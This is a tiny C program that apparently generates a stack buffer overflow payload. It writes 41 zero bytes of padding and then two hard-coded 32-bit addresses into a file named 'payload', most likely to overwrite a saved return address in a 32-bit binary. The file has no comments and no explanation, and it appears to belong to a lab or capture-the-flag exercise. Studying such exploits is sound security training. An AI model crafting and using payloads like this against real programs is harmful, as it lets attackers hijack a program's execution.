#include <stdio.h>



int main(void)
{
	FILE *f = fopen("payload", "w");
	int i = 0;
	while (i<41) {
		fprintf(f, "%c", 0);
		i++;
	}	
	fprintf(f, "%c", 0xa6);
	fprintf(f, "%c", 0x84);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);
	fprintf(f, "%c", 0xe4);
	fprintf(f, "%c", 0x84);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);
	fclose(f);

	return 0;
}
